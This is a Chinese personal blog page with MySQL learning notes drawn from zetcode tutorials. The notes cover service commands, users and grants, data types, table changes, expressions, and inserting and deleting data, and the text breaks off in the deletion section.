<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/6/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/sql/2014/05/31/mysql-learning-notes/" itemprop="url">
                  MySQL Learning Notes
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-31T00:00:00+08:00" content="2014-05-31">
              2014-05-31
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/sql/" itemprop="url" rel="index">
                    <span itemprop="name">SQL</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/sql/2014/05/31/mysql-learning-notes/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="sql/2014/05/31/mysql-learning-notes/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>随便看看，来自<a href="http://zetcode.com" target="_blank" rel="external">http://zetcode.com</a>的教程笔记。放到一个文档里便于通过<code>Ctrl+F</code>快速查找。</p>
<h2 id="安装">安装</h2><p>从软件源安装基本是一键安装。</p>
<p>源码安装参见<a href="http://zetcode.com/databases/mysqltutorial/installation" target="_blank" rel="external">MySQL installation</a></p>
<h2 id="初步">初步</h2><p>启动和停止服务，反正gentoo下是</p>
<pre><code>sudo /etc/init.d/mysqld <span class="operator"><span class="keyword">start</span>
sudo /etc/init.<span class="keyword">d</span>/mysqld <span class="keyword">stop</span>
sudo /etc/init.<span class="keyword">d</span>/mysqld restart</span>
</code></pre><p>手动启动<code>mysqld_safe &amp;</code>也行。</p>
<p>检查服务是否启动：</p>
<pre><code> <span class="regexp">~/Work/</span>learn/MySQL ⮀ mysqladmin -uroot -p ping
Enter <span class="string">password:</span> 
mysqld is alive
</code></pre><p><code>mysqladmin</code>还可以用来关闭服务，参见<code>man mysqladmin</code>.</p>
<p><code>mysql -uroot -p</code>直接连接到mysql的交互shell中去。</p>
<p>在这个shell中可以使用命令(比如<code>system pwd</code>)也可以使用SQL语句，SQL语句以分号结束。</p>
<p>查看数据库:</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> <span class="keyword">DATABASES</span>;</span>
</code></pre><p>创建数据库<code>mydb</code></p>
<pre><code>CREAT DATABASE mydb<span class="comment">;</span>
</code></pre><p>使用数据库<code>mydb</code></p>
<pre><code><span class="keyword">use</span> <span class="title">mydb</span>;
</code></pre><p>显示数据库中的表：</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span>;</span>
</code></pre><p>执行数据库文件：</p>
<pre><code><span class="built_in">source</span> cars.sql
</code></pre><p>从表中选择：</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;</span>
</code></pre><p>创建新用户</p>
<pre><code><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">USER</span> user123@localhost <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'pass123'</span>;</span>
</code></pre><p>授予用户对特定数据库/表的特定权限</p>
<pre><code><span class="operator"><span class="keyword">GRANT</span> ALL <span class="keyword">ON</span> mydb.* <span class="keyword">to</span> user123@localhost;</span>
</code></pre><h2 id="快速教程">快速教程</h2><p>root用户：</p>
<ul>
<li>创建数据库</li>
<li>使用数据库</li>
<li>导入数据库文件(吐槽下mysql数据库导入的神慢)</li>
<li>授予权限</li>
</ul>
<p>普通用户：</p>
<ul>
<li>查看数据库</li>
<li>使用数据库</li>
<li>查看表</li>
</ul>
<p>描述表：</p>
<pre><code><span class="operator"><span class="keyword">DESCRIBE</span> City;</span>
</code></pre><p>查看创建表的命令</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> CREAT <span class="keyword">TABLE</span> City;</span>
</code></pre><p>使用<code>mysqldump</code>备份表(在系统shell中而不是mysql的交互shell)</p>
<pre><code>mysqldump -uroot -<span class="tag">p</span> world City &gt; city.sql
</code></pre><p>移除表</p>
<pre><code><span class="operator"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> City;</span>
</code></pre><p>接着讲讲查表。</p>
<p>限制条数：</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> <span class="keyword">Id</span>, <span class="keyword">Name</span>, Population <span class="keyword">FROM</span> City <span class="keyword">LIMIT</span> <span class="number">10</span>;</span>
<span class="operator"><span class="keyword">SELECT</span> <span class="keyword">Id</span>, <span class="keyword">Name</span>, Population <span class="keyword">FROM</span> City <span class="keyword">LIMIT</span> <span class="number">15</span>, <span class="number">5</span>;</span>
</code></pre><p>使用<code>less</code>分页，</p>
<pre><code>pager <span class="operator">less</span>
</code></pre><p>非交互式使用SQL命令</p>
<pre><code>mysql -<span class="keyword">u</span> user123 -p world -<span class="keyword">e</span> <span class="string">"SELECT * FROM City"</span> &gt; city
</code></pre><p>COUNT函数</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(<span class="keyword">Id</span>) <span class="keyword">AS</span> <span class="string">'Number of rows'</span> <span class="keyword">FROM</span> City;</span>
</code></pre><p>MAX, 下面命令显示了SQL的子查询特性:</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Population <span class="keyword">FROM</span> City
    -&gt; WHERE Population = (<span class="built_in">SELECT</span> <span class="built_in">Max</span>(Population) <span class="keyword">FROM</span> City);
</code></pre><p>MIN:</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Population <span class="keyword">FROM</span> City
    -&gt; WHERE Population = (<span class="built_in">SELECT</span> <span class="built_in">Min</span>(Population) <span class="keyword">FROM</span> City);
</code></pre><p>WHERE语句</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> Population &gt; <span class="number">1000000</span>;

mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> City <span class="keyword">WHERE</span> Name <span class="keyword">LIKE</span> <span class="comment">'Kal%';</span>

mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> ID <span class="keyword">IN</span> (<span class="number">5</span>, <span class="number">32</span>, <span class="number">344</span>, <span class="number">554</span>);

mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> City <span class="keyword">WHERE</span> Name = <span class="comment">'Bratislava';</span>

mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> Population BETWEEN <span class="number">670000</span> <span class="keyword">AND</span> <span class="number">700000</span>;
</code></pre><p>排序数据</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Population DESC LIMIT <span class="number">10</span>;

mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City 
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Population ASC LIMIT <span class="number">10</span>;

mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City 
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Name LIMIT <span class="number">10</span>;
</code></pre><p>聚合数据</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> District, <span class="keyword">SUM</span>(Population) FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> District = <span class="string">'Henan'</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> District;

mysql&gt; <span class="keyword">SELECT</span> Name, District, Population FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> District = <span class="string">'Henan'</span>;

mysql&gt; <span class="keyword">SELECT</span> District, <span class="keyword">SUM</span>(Population) FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> CountryCode = <span class="string">'USA'</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> District
    <span class="subst">-&gt; </span>HAVING <span class="keyword">SUM</span>(Population) &gt; <span class="number">3000000</span>;
</code></pre><p>更新，删除和插入数据</p>
<pre><code>mysql&gt; UPDATE Country <span class="built_in">SET</span> HeadOfState = <span class="string">'Xi Jinping'</span> 
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> Name = <span class="string">'China'</span>;

mysql&gt; DELETE FROM City <span class="keyword">WHERE</span> ID <span class="keyword">IN</span> (<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>);

mysql&gt; TRUNCATE TABLE City;

mysql&gt; INSERT <span class="keyword">INTO</span> City VALUES(<span class="number">999999</span>, <span class="string">'Kabul'</span>, <span class="string">'AFG'</span>, <span class="string">'Kabol'</span>, <span class="number">1780000</span>);

mysql&gt; DROP TABLE City
</code></pre><h2 id="MySQL存储引擎">MySQL存储引擎</h2><p>存储引擎是数据库管理系统读写更新数据库中数据的软件模型。</p>
<p>MySQL支持的存储引擎有：</p>
<ul>
<li>MyISAM，早于5.5版本的默认引擎</li>
<li>InnoDB</li>
<li>Memory</li>
<li>CSV</li>
<li>等等</li>
</ul>
<p>情况很复杂，选择之前最好上<a href="http://stackoverflow.com/" target="_blank" rel="external">StackOverFlow</a>问问。</p>
<p>创建表时使用<code>ENGINE</code>关键字指定引擎：</p>
<pre><code>mysql&gt; CREATE TABLE Cars(Id <span class="built_in">INTEGER</span> PRIMARY KEY, Name VARCHAR(<span class="number">50</span>), 
    <span class="subst">-&gt; </span>Cost <span class="built_in">INTEGER</span>) ENGINE=<span class="string">'MyISAM'</span>;
</code></pre><p>查看当前引擎：</p>
<pre><code>mysql&gt; SHOW <span class="section"><span class="keyword">VARIABLES</span> LIKE 'storage_engine';</span>
</code></pre><p>发现特定数据库的表引擎</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> ENGINE FROM information_schema<span class="built_in">.</span>TABLES
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'mydb'</span>
    <span class="subst">-&gt; </span><span class="subst">AND</span> TABLE_NAME=<span class="string">'Cars'</span>;
</code></pre><p>更改表的引擎：</p>
<pre><code>mysql&gt; ALTER <span class="keyword">TABLE</span> Cars ENGINE=<span class="string">'InnoDB'</span>;
</code></pre><h2 id="MySQL数据类型">MySQL数据类型</h2><h3 id="数值">数值</h3><p>整数：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Bytes</th>
<th>Minimum value</th>
<th>Maximum value</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>-128</td>
<td>127</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>-32768</td>
<td>32767</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3</td>
<td>-8388608</td>
<td>8388607</td>
</tr>
<tr>
<td>INTEGER</td>
<td>4</td>
<td>-2147483648</td>
<td>2147483647</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>-9223372036854775808</td>
<td>9223372036854775807</td>
</tr>
</tbody>
</table>
<p>浮点：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Bytes</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLOAT</td>
<td>4</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8</td>
</tr>
<tr>
<td>DECIML</td>
<td>(M位，小数点后D位)</td>
</tr>
</tbody>
</table>
<p>定义表时指定：</p>
<pre><code>mysql&gt; CREATE TABLE Numbers <span class="list">(<span class="keyword">Id</span> TINYINT, Floats FLOAT, Decimals DECIMAL<span class="list">(<span class="number">3</span>, <span class="number">2</span>)</span>)</span><span class="comment">;</span>
</code></pre><p>更改列字段内型：</p>
<pre><code>mysql&gt; ALTER TABLE Ages MODIFY Age TINYINT UNSIGNED<span class="comment">;</span>
</code></pre><p>插入值</p>
<pre><code><span class="tag">mysql</span>&gt; <span class="tag">INSERT</span> <span class="tag">INTO</span> <span class="tag">Numbers</span> <span class="tag">VALUES</span> (1, 1<span class="class">.1</span>, 1<span class="class">.1</span>), (2, 1<span class="class">.1</span>, 1<span class="class">.1</span>), (3, 1<span class="class">.1</span>, 1<span class="class">.1</span>);
</code></pre><p>DECIMAL类型更加精确，FLOAT和DOUBLE都只是近似。</p>
<h3 id="日期和时间">日期和时间</h3><p>有这么几种：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>范围</th>
<th>显示格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>DATE</td>
<td>‘1000-01-01’ 到 ‘9999-12-31’.</td>
<td>YYYY-MM-DD</td>
</tr>
<tr>
<td>TIME</td>
<td>‘-838:59:59’ to ‘838:59:59’.</td>
<td>HH:MM:SS</td>
</tr>
<tr>
<td>DATETIME</td>
<td>‘1000-01-01 00:00:00’ to ‘9999-12-31 23:59:59’.</td>
<td>YYYY-MM-DD HH:MM:SS</td>
</tr>
<tr>
<td>YEAR</td>
<td>1901 to 2155</td>
<td>YYYY</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>‘1970-01-01 00:00:01’ UTC to ‘2038-01-19 03:14:07’ UTC</td>
<td>见下表</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Format</th>
</tr>
</thead>
<tbody>
<tr>
<td>TIMESTAMP(14)</td>
<td>YYYYMMDDHHMMSS</td>
</tr>
<tr>
<td>TIMESTAMP(12)</td>
<td>YYMMDDHHMMSS</td>
</tr>
<tr>
<td>TIMESTAMP(10)</td>
<td>YYMMDDHHMM</td>
</tr>
<tr>
<td>TIMESTAMP(8)</td>
<td>YYYYMMDD</td>
</tr>
<tr>
<td>TIMESTAMP(6)</td>
<td>YYMMDD</td>
</tr>
<tr>
<td>TIMESTAMP(4)</td>
<td>YYMM</td>
</tr>
<tr>
<td>TIMESTAMP(2)</td>
<td>YY</td>
</tr>
</tbody>
</table>
<p>DATE、DATETIME和DATE输入时可支持多种格式，分隔符可以任意，超出范围截断到0.</p>
<pre><code>mysql&gt; CREATE <span class="function">TABLE <span class="title">Dates</span><span class="params">(Id TINYINT, Dates DATE)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">1</span>, <span class="string">'2011-01-24'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">2</span>, <span class="string">'2011/01/25'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'20110126'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">4</span>, <span class="string">'110127'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">5</span>, <span class="string">'2011+01+28'</span>)</span></span>;
</code></pre><p><code>TIMEDIFF</code>计算时差：</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">TIMEDIFF</span><span class="params">(<span class="string">'23:34:32'</span>, <span class="string">'22:00:00'</span>)</span></span>;
</code></pre><p><code>TIME</code>函数提取时间部分</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">TIME</span><span class="params">(<span class="string">'2011-01-29 11:27:42'</span>)</span></span>;
</code></pre><p><code>DAYNAME</code>函数提取星期名。</p>
<pre><code>mysql&gt; SELECT DAYNAME('<span class="number">2011</span><span class="number">@01</span><span class="number">@29</span> <span class="number">11</span><span class="number">@50</span><span class="number">@13</span>');
</code></pre><p>MySQL自动填充TIMESTAMP列，记录<code>INSERT</code>和<code>UPDATE</code>时间。</p>
<h3 id="字符串">字符串</h3><table>
<thead>
<tr>
<th>Data type</th>
<th>Format</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CHAR</td>
<td>CHAR(x),x=0:255</td>
<td>定长字符串存储</td>
</tr>
<tr>
<td>VARCHAR</td>
<td>VARCHAR(x),x=0:65535</td>
<td>变长字符串数据存储</td>
</tr>
<tr>
<td>BINARY</td>
<td>BINARY(x),x=0:255</td>
<td>定长字节存储</td>
</tr>
<tr>
<td>VARBINARY</td>
<td>VARBINARY(x),x=0:65535</td>
<td>变长字节存储</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0-255</td>
<td>BLOB存储大二进制对象</td>
</tr>
<tr>
<td>BLOB</td>
<td>0-65535</td>
<td></td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0 - 16777215</td>
<td></td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0 - 4294967295</td>
<td></td>
</tr>
<tr>
<td>TINYTEXT</td>
<td>0-255</td>
<td>TEXT存储大文本数据</td>
</tr>
<tr>
<td>TEXT</td>
<td>0-65535</td>
<td></td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0 - 16777215</td>
<td></td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0 - 4294967295</td>
</tr>
</tbody>
</table>
<p><code>ENUM</code>创建一个只能插入列表中特定值的表</p>
<pre><code>mysql&gt; CREATE TABLE SizeTable<span class="list">(<span class="keyword">Size</span> ENUM<span class="list">(<span class="quoted">'S</span>', <span class="quoted">'M</span>', <span class="quoted">'L</span>', <span class="quoted">'XL</span>', <span class="quoted">'XXL</span>')</span>)</span><span class="comment">;</span>
</code></pre><p><code>SET</code>类似于<code>ENUM</code>，但可以包含0个或多个列表中的值。</p>
<h2 id="创建、更改和删除表">创建、更改和删除表</h2><h3 id="创建指令">创建指令</h3><p>创建一个表，指定表名、列的名称和类型：</p>
<pre><code>mysql&gt; CREATE <span class="keyword">TABLE</span> Testing(Id <span class="keyword">INTEGER</span>);
</code></pre><p>查看某个表的建表语句</p>
<pre><code>mysql&gt; SHOW CREATE TABLE Testing<span class="comment">;</span>
</code></pre><p>创建的，非临时表可以通过<code>SHOW TABLES</code>语法查看：</p>
<pre><code>mysql&gt; SHOW TABLES <span class="keyword">LIKE</span> <span class="comment">'T%';</span>
</code></pre><h2 id="删除表">删除表</h2><p>删除表：</p>
<pre><code>mysql&gt; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> Testing;
</code></pre><h2 id="更改表">更改表</h2><p>使用<code>ALTER TABLE</code>语法更改表。以下为重命名表、添加列、添加主键、更改列、删除列操作。(DESCRIBE和SHOW COLUMNS FROM同义，INTEGER和INT相同)</p>
<pre><code>mysql&gt; ALTER <span class="keyword">TABLE</span> Testing <span class="keyword">RENAME</span> TO TestTable;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable ADD iValues INT;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable ADD PRIMARY KEY (Id);
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable CHANGE COLUMN iValues iValues1 INT;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable <span class="keyword">DROP</span> COLUMN iValues1;
</code></pre><h2 id="MySQL表达式">MySQL表达式</h2><h3 id="字面常量">字面常量</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="number">3</span>, <span class="string">'Wolf'</span>, <span class="number">34.5</span>, <span class="number">0x34</span>, <span class="number">0</span>+b<span class="string">'10111'</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="literal">NULL</span>, \N<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="literal">TRUE</span>, <span class="literal">FALSE</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="string">'2011-01-11'</span>, <span class="string">'23:33:01'</span>, <span class="string">'98/11/31/ 14:22:20'</span><span class="comment">;</span>
</code></pre><h3 id="变量">变量</h3><pre><code>mysql&gt; SET <span class="constant">@name</span> = <span class="string">'Jane'</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="constant">@name</span><span class="comment">;</span>
</code></pre><h3 id="运算符">运算符</h3><p>包括一元的</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">NOT</span> <span class="params">(<span class="number">3</span>&gt;<span class="number">9</span>)</span></span>;
</code></pre><p>算术的：</p>
<pre><code>mysql&gt; SELECT <span class="number">9</span>/<span class="number">2</span>, <span class="number">9</span> DIV <span class="number">2</span>;
</code></pre><p>逻辑的：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="literal">FALSE</span> <span class="keyword">XOR</span> <span class="literal">FALSE</span>, <span class="literal">FALSE</span> <span class="keyword">XOR</span> <span class="literal">TRUE</span>,
-&gt; <span class="literal">TRUE</span> <span class="keyword">XOR</span> <span class="literal">FALSE</span>, <span class="literal">TRUE</span> <span class="keyword">XOR</span> <span class="literal">TRUE</span>;
</code></pre><p>关系的：</p>
<pre><code>mysql&gt; SELECT <span class="number">3</span> * <span class="number">3</span> = <span class="number">9</span>, <span class="number">9</span> = <span class="number">9</span>, <span class="number">3</span> &lt; <span class="number">4</span>, <span class="number">3</span> &lt;&gt; <span class="number">5</span>, <span class="number">4</span> &lt;= <span class="number">4</span>, <span class="number">5</span> != <span class="number">5</span>;
</code></pre><p>位的：</p>
<pre><code>mysql&gt; SELECT <span class="number">6</span> | <span class="number">3</span>, <span class="number">6</span> &amp; <span class="number">3</span>, <span class="number">6</span> &lt;&lt; <span class="number">1</span>;
</code></pre><p>其它：</p>
<pre><code>mysql&gt; <span class="keyword">SET</span> @running = <span class="keyword">FALSE</span>;
mysql&gt; <span class="keyword">SELECT</span> @running <span class="keyword">IS</span> <span class="keyword">FALSE</span>;
mysql&gt; <span class="keyword">SELECT</span> <span class="string">'Tom'</span> <span class="keyword">IN</span> (<span class="string">'Tom'</span>, <span class="string">'Frank'</span>, <span class="string">'Jane'</span>);
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">Where</span> Name <span class="keyword">IN</span> (<span class="string">'Audi'</span>, <span class="string">'Hummer'</span>);
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name LIKE <span class="string">'Vol%'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name LIKE <span class="string">'____'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name REGEXP <span class="string">'e.$'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name REGEXP <span class="string">'^.e.*e.$'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost BETWEEN <span class="number">20000</span> <span class="keyword">AND</span> <span class="number">55000</span>;
</code></pre><h3 id="优先级">优先级</h3><p>加个括号吧</p>
<p>同级运算符从左到右执行</p>
<h2 id="插入、更新和删除数据">插入、更新和删除数据</h2><h2 id="插入">插入</h2><p>插入时可以指定插入的列，也可以不指定</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books(Id, Title, Auth<span class="subst">or</span>) VALUES(<span class="number">1</span>, <span class="string">'War and Peace'</span>, 
<span class="subst">-&gt; </span><span class="string">'Leo Tolstoy'</span>);
mysql&gt; INSERT <span class="keyword">INTO</span> Books VALUES(<span class="number">3</span>, <span class="string">'Crime and Punishment'</span>,
<span class="subst">-&gt; </span><span class="string">'Fyodor Dostoyevsky'</span>);
</code></pre><p>若不指定<code>Id</code>也可。</p>
<pre><code>mysql&gt; INSERT INTO Books<span class="list">(<span class="keyword">Title</span>, Author)</span> VALUES <span class="list">(<span class="quoted">'The</span> Brothers Karamazov',
-&gt; <span class="quoted">'Fyodor</span> Dostoyevsky')</span><span class="comment">;</span>
</code></pre><p>一次可以插入单个或多个值</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books(Title, Auth<span class="subst">or</span>) VALUES (<span class="string">'The Insulted and Humiliated'</span>,
<span class="subst">-&gt; </span><span class="string">'Fyodor Dostoyevsky'</span>), (<span class="string">'Cousin Bette'</span>, <span class="string">'Honore de Balzac'</span>);
</code></pre><p><code>REPLACE</code>可以取代特定行：</p>
<pre><code>mysql&gt; REPLACE INTO <span class="function">Books <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'Paradise Lost'</span>, <span class="string">'John Milton'</span>)</span></span>;
</code></pre><p>插入也可以和<code>SELECT</code>结合：</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books2 <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Books;
</code></pre><p>可以使用<code>LOAD DATA INFILE</code>和<code>LOAD XML INFILE</code>语法从文件插入：</p>
<pre><code>mysql&gt; LOAD <span class="built_in">DATA</span> INFILE <span class="string">'/tmp/books.csv'</span>    
    <span class="subst">-&gt; </span><span class="keyword">INTO</span> TABLE Books    
    <span class="subst">-&gt; </span>FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">','</span>    
    <span class="subst">-&gt; </span>LINES TERMINATED <span class="keyword">BY</span> <span class="string">'\n'</span>;

mysql&gt; LOAD <span class="built_in">XML</span> INFILE <span class="string">'/home/vronskij/programming/mysql/books.xml'</span> <span class="keyword">INTO</span> TABLE Books;
</code></pre><h3 id="删除">删除</h3><p>从表中删除：</p>
<pre><code>mysql&gt; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> Books2 WHERE Id=<span class="number">1</span>;
